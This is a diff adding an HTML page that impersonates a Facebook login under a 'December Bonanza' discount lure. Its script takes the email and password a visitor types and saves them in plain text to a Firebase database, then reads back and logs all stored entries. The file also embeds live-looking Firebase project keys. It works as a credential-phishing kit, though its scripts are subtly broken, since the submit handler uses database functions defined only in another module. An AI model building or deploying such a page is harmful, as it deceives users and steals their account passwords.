@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login - December Bonanza</title>
+    
+    <!-- Firebase SDKs -->
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-analytics.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyClsqiHaynymbq5JzxC3pEiHOHRQnv8DDU",
+            authDomain: "project-6748149258001548648.firebaseapp.com",
+            databaseURL: "https://project-6748149258001548648-default-rtdb.firebaseio.com",
+            projectId: "project-6748149258001548648",
+            storageBucket: "project-6748149258001548648.firebasestorage.app",
+            messagingSenderId: "1080075342560",
+            appId: "1:1080075342560:web:24aab27c24ac5e0de4b685",
+            measurementId: "G-1RZKYCH0RG"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getDatabase(app);
+    </script>
+
+    <style>
+        /* Add your existing CSS here */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+        }
+        .logo {
+            width: 150px;
+            margin: 20px auto;
+        }
+        .promo-message {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff6347;
+            margin: 20px 0;
+        }
+        .input-group {
+            margin: 10px 0;
+        }
+        input {
+            padding: 10px;
+            font-size: 16px;
+            width: 250px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #28a745;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .signup-option {
+            margin-top: 15px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="gflock-logo.png" alt="GFLock Logo" class="logo">
+        <h2>Facebook Login</h2>
+        <div class="promo-message">
+            December Bonanza - Hurry up! <br>Get registered now for 50% off!
+        </div>
+        
+        <!-- Form for login -->
+        <form id="login-form">
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="Enter email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+            </div>
+            <button type="submit" id="login-btn">Login</button>
+        </form>
+        <div class="signup-option">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Get DOM elements
+        const loginForm = document.getElementById('login-form');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('login-btn');
+
+        // Handle form submission for login
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+            // Save login attempt data to Firebase Realtime Database
+            const userRef = ref(db, 'users/' + email.replace(".", "_")); // Use email as key but replace dot with underscore
+            set(userRef, {
+                email: email,
+                password: password
+            }).then(() => {
+                alert("Login attempt saved!");
+            }).catch(error => {
+                alert("Error saving data: " + error.message);
+            });
+        });
+
+        // Retrieve data from Firebase (example: listen for data changes)
+        const usersRef = ref(db, 'users');
+        onValue(usersRef, (snapshot) => {
+            const usersData = snapshot.val();
+            console.log("Realtime Data: ", usersData);
+        });
+    </script>
+</body>
+</html>
